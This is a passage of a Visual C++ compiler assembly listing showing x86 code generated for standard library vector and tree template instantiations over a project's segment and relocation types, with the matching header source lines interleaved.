  00032	53		 push	 ebx
  00033	ff 75 fc	 push	 DWORD PTR __First$GSCopy$1$[ebp]
  00036	56		 push	 esi
  00037	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 497  :             _My_data._Mylast = _Ucopy(_First, _Last, _My_data._Myfirst);

  0003c	8b 4d f8	 mov	 ecx, DWORD PTR _this$GSCopy$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  0003f	8d 04 be	 lea	 eax, DWORD PTR [esi+edi*4]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00042	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 497  :             _My_data._Mylast = _Ucopy(_First, _Last, _My_data._Myfirst);

  00045	89 41 04	 mov	 DWORD PTR [ecx+4], eax
$LN21@Range_cons:

; 498  :             _Guard._Target   = nullptr;
; 499  :         }
; 500  :     }

  00048	5f		 pop	 edi
  00049	5e		 pop	 esi
  0004a	5b		 pop	 ebx
  0004b	8b e5		 mov	 esp, ebp
  0004d	5d		 pop	 ebp
  0004e	c2 0c 00	 ret	 12			; 0000000cH
$LN44@Range_cons:

; 1660 :             _Xlength();

  00051	e8 00 00 00 00	 call	 ?_Xlength@?$vector@PBDV?$allocator@PBD@std@@@std@@CAXXZ ; std::vector<char const *,std::allocator<char const *> >::_Xlength
$LN42@Range_cons:
  00056	cc		 int	 3
??$_Range_construct_or_tidy@PBQBD@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXPBQBD0Uforward_iterator_tag@1@@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::_Range_construct_or_tidy<char const * const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$?0V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 1
__Val1$dead$ = 12					; size = 4
??$?0V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z PROC ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1><std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00000	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00006	8b c1		 mov	 eax, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00008	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0
  0000f	c7 41 08 00 00
	00 00		 mov	 DWORD PTR [ecx+8], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00016	c2 08 00	 ret	 8
??$?0V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z ENDP ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1><std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??$_Ucopy@PAURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PAU23@00@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Dest$ = 16						; size = 4
??$_Ucopy@PAURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PAU23@00@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Ucopy<SegmentFramework::RelocatedNetVar *>, COMDAT
; _this$dead$ = ecx

; 1587 :     pointer _Ucopy(_Iter _First, _Iter _Last, pointer _Dest) { // copy [_First, _Last) to raw _Dest, using allocator

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00006	56		 push	 esi
  00007	8b 75 10	 mov	 esi, DWORD PTR __Dest$[ebp]
  0000a	57		 push	 edi
  0000b	8b 7d 0c	 mov	 edi, DWORD PTR __Last$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3753 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

  0000e	2b f8		 sub	 edi, eax

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00010	57		 push	 edi
  00011	50		 push	 eax
  00012	56		 push	 esi
  00013	e8 00 00 00 00	 call	 _memmove
  00018	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  0001b	c1 ff 03	 sar	 edi, 3
  0001e	8d 04 fe	 lea	 eax, DWORD PTR [esi+edi*8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00021	5f		 pop	 edi
  00022	5e		 pop	 esi

; 1589 :     }

  00023	5d		 pop	 ebp
  00024	c2 0c 00	 ret	 12			; 0000000cH
??$_Ucopy@PAURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEPAURelocatedNetVar@SegmentFramework@@PAU23@00@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Ucopy<SegmentFramework::RelocatedNetVar *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$?0ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 1
__Val1$dead$ = 12					; size = 4
??$?0ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z PROC ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1><std::allocator<SegmentFramework::RelocatedNetVar> const &>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00000	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00006	8b c1		 mov	 eax, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  00008	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0
  0000f	c7 41 08 00 00
	00 00		 mov	 DWORD PTR [ecx+8], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00016	c2 08 00	 ret	 8
??$?0ABV?$allocator@URelocatedNetVar@SegmentFramework@@@std@@$$V@?$_Compressed_pair@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@V?$_Vector_val@U?$_Simple_types@URelocatedNetVar@SegmentFramework@@@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@URelocatedNetVar@SegmentFramework@@@1@@Z ENDP ; std::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1>::_Compressed_pair<std::allocator<SegmentFramework::RelocatedNetVar>,std::_Vector_val<std::_Simple_types<SegmentFramework::RelocatedNetVar> >,1><std::allocator<SegmentFramework::RelocatedNetVar> const &>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ??$_Range_construct_or_tidy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPBURelocatedNetVar@SegmentFramework@@0Uforward_iterator_tag@1@@Z
_TEXT	SEGMENT
_this$GSCopy$1$ = -8					; size = 4
__First$GSCopy$1$ = -4					; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
___formal$ = 16						; size = 1
??$_Range_construct_or_tidy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPBURelocatedNetVar@SegmentFramework@@0Uforward_iterator_tag@1@@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Range_construct_or_tidy<SegmentFramework::RelocatedNetVar const *>, COMDAT
; _this$ = ecx

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00009	53		 push	 ebx
  0000a	8b 5d 0c	 mov	 ebx, DWORD PTR __Last$[ebp]
  0000d	56		 push	 esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  0000e	2b d8		 sub	 ebx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  00010	89 45 fc	 mov	 DWORD PTR __First$GSCopy$1$[ebp], eax
  00013	57		 push	 edi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00014	8b fb		 mov	 edi, ebx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  00016	8b f1		 mov	 esi, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 1705 :         return _Last - _First; // assume the iterator will do debug checking

  00018	c1 ff 03	 sar	 edi, 3
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 491  :     void _Range_construct_or_tidy(_Iter _First, _Iter _Last, forward_iterator_tag) {

  0001b	89 75 f8	 mov	 DWORD PTR _this$GSCopy$1$[ebp], esi

; 492  :         const auto _Count = _Convert_size<size_type>(static_cast<size_t>(_STD distance(_First, _Last)));
; 493  :         if (_Count != 0) {

  0001e	85 ff		 test	 edi, edi
  00020	74 26		 je	 SHORT $LN21@Range_cons

; 1659 :         if (_Newcapacity > max_size()) {

  00022	81 ff ff ff ff
	1f		 cmp	 edi, 536870911		; 1fffffffH
  00028	77 27		 ja	 SHORT $LN44@Range_cons

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

  0002a	57		 push	 edi
  0002b	e8 00 00 00 00	 call	 ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw

; 1588 :         return _Uninitialized_copy(_First, _Last, _Dest, _Getal());

  00030	8b 36		 mov	 esi, DWORD PTR [esi]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00032	53		 push	 ebx
  00033	ff 75 fc	 push	 DWORD PTR __First$GSCopy$1$[ebp]
  00036	56		 push	 esi
  00037	e8 00 00 00 00	 call	 _memmove
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 497  :             _My_data._Mylast = _Ucopy(_First, _Last, _My_data._Myfirst);

  0003c	8b 4d f8	 mov	 ecx, DWORD PTR _this$GSCopy$1$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1528 :         _Dest += _ULast - _UFirst;

  0003f	8d 04 fe	 lea	 eax, DWORD PTR [esi+edi*8]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 3754 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

  00042	83 c4 0c	 add	 esp, 12			; 0000000cH
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 497  :             _My_data._Mylast = _Ucopy(_First, _Last, _My_data._Myfirst);

  00045	89 41 04	 mov	 DWORD PTR [ecx+4], eax
$LN21@Range_cons:

; 498  :             _Guard._Target   = nullptr;
; 499  :         }
; 500  :     }

  00048	5f		 pop	 edi
  00049	5e		 pop	 esi
  0004a	5b		 pop	 ebx
  0004b	8b e5		 mov	 esp, ebp
  0004d	5d		 pop	 ebp
  0004e	c2 0c 00	 ret	 12			; 0000000cH
$LN44@Range_cons:

; 1660 :             _Xlength();

  00051	e8 00 00 00 00	 call	 ?_Xlength@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@CAXXZ ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Xlength
$LN42@Range_cons:
  00056	cc		 int	 3
??$_Range_construct_or_tidy@PBURelocatedNetVar@SegmentFramework@@@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXPBURelocatedNetVar@SegmentFramework@@0Uforward_iterator_tag@1@@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Range_construct_or_tidy<SegmentFramework::RelocatedNetVar const *>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$?0ABU?$less@PBD@std@@U_Zero_then_variadic_args_t@1@@?$_Compressed_pair@U?$less@PBD@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABU?$less@PBD@1@$$QAU_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 1
__Val1$dead$ = 12					; size = 4
_<_Val2_0>$dead$ = 16					; size = 4
??$?0ABU?$less@PBD@std@@U_Zero_then_variadic_args_t@1@@?$_Compressed_pair@U?$less@PBD@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABU?$less@PBD@1@$$QAU_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::less<char const *>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>,1>::_Compressed_pair<std::less<char const *>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>,1><std::less<char const *> const &,std::_Zero_then_variadic_args_t>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00000	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00006	8b c1		 mov	 eax, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00008	c7 41 04 00 00
	00 00		 mov	 DWORD PTR [ecx+4], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 1333 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  0000f	c2 0c 00	 ret	 12			; 0000000cH
??$?0ABU?$less@PBD@std@@U_Zero_then_variadic_args_t@1@@?$_Compressed_pair@U?$less@PBD@std@@V?$_Compressed_pair@V?$allocator@U?$_Tree_node@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@PAX@std@@@std@@V?$_Tree_val@U?$_Tree_simple_types@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@std@@@2@$00@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABU?$less@PBD@1@$$QAU_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::less<char const *>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>,1>::_Compressed_pair<std::less<char const *>,std::_Compressed_pair<std::allocator<std::_Tree_node<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > >,void *> >,std::_Tree_val<std::_Tree_simple_types<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >,1>,1><std::less<char const *> const &,std::_Zero_then_variadic_args_t>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$_Destroy_range@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAXPAURelocatedNetVar@SegmentFramework@@QAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z
_TEXT	SEGMENT
__Al$dead$ = 8						; size = 4
??$_Destroy_range@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAXPAURelocatedNetVar@SegmentFramework@@QAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z PROC ; std::_Destroy_range<std::allocator<SegmentFramework::RelocatedNetVar> >, COMDAT
; __First$dead$ = ecx
; __Last$dead$ = edx

; 941  :     // note that this is an optimization for debug mode codegen; in release mode the BE removes all of this
; 942  :     using _Ty = typename _Alloc::value_type;
; 943  :     if
; 944  :         _CONSTEXPR_IF(conjunction_v<is_trivially_destructible<_Ty>, _Uses_default_destroy<_Alloc, _Ty*>>) {
; 945  :             (void) _First;
; 946  :             (void) _Last;
; 947  :             (void) _Al;
; 948  :         }
; 949  :     else {
; 950  :         for (; _First != _Last; ++_First) {
; 951  :             allocator_traits<_Alloc>::destroy(_Al, _Unfancy(_First));
; 952  :         }
; 953  :     }
; 954  : }

  00000	c2 00 00	 ret	 0
??$_Destroy_range@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@YAXPAURelocatedNetVar@SegmentFramework@@QAU12@AAV?$allocator@URelocatedNetVar@SegmentFramework@@@0@@Z ENDP ; std::_Destroy_range<std::allocator<SegmentFramework::RelocatedNetVar> >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??$_Get_size_of_n@$07@std@@YAII@Z
_TEXT	SEGMENT
??$_Get_size_of_n@$07@std@@YAII@Z PROC			; std::_Get_size_of_n<8>, COMDAT
; __Count$ = ecx

; 29   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;
; 30   : 
; 31   :     if
; 32   :         _CONSTEXPR_IF(_Overflow_is_possible) {
; 33   :             constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;
; 34   :             if (_Count > _Max_possible) {

  00000	81 f9 ff ff ff
	1f		 cmp	 ecx, 536870911		; 1fffffffH
  00006	0f 87 00 00 00
	00		 ja	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length

; 35   :                 _Throw_bad_array_new_length(); // multiply overflow
; 36   :             }
; 37   :         }
; 38   : 
; 39   :     return _Count * _Ty_size;

  0000c	8d 04 cd 00 00
	00 00		 lea	 eax, DWORD PTR [ecx*8]

; 40   : }

  00013	c3		 ret	 0
??$_Get_size_of_n@$07@std@@YAII@Z ENDP			; std::_Get_size_of_n<8>
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Buy_nonzero@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z
_TEXT	SEGMENT
__Newcapacity$ = 8					; size = 4
?_Buy_nonzero@?$vector@PBDV?$allocator@PBD@std@@@std@@AAEXI@Z PROC ; std::vector<char const *,std::allocator<char const *> >::_Buy_nonzero, COMDAT
; _this$ = ecx

; 1648 :     void _Buy_nonzero(const size_type _Newcapacity) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1649 :         // allocate array with _Newcapacity elements
; 1650 : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 1651 :         auto& _My_data    = _Mypair._Myval2;
; 1652 :         pointer& _Myfirst = _My_data._Myfirst;
; 1653 :         pointer& _Mylast  = _My_data._Mylast;
; 1654 :         pointer& _Myend   = _My_data._Myend;
; 1655 :         _STL_INTERNAL_CHECK(!_Myfirst && !_Mylast && !_Myend); // check that *this is tidy
; 1656 :         _STL_INTERNAL_CHECK(0 < _Newcapacity);
; 1657 : #endif // _ENABLE_STL_INTERNAL_CHECK
; 1658 : 
; 1659 :         if (_Newcapacity > max_size()) {

  00003	8b 45 08	 mov	 eax, DWORD PTR __Newcapacity$[ebp]
  00006	3d ff ff ff 3f	 cmp	 eax, 1073741823		; 3fffffffH
  0000b	77 09		 ja	 SHORT $LN7@Buy_nonzer

; 1661 :         }
; 1662 : 
; 1663 :         _Buy_raw(_Newcapacity);

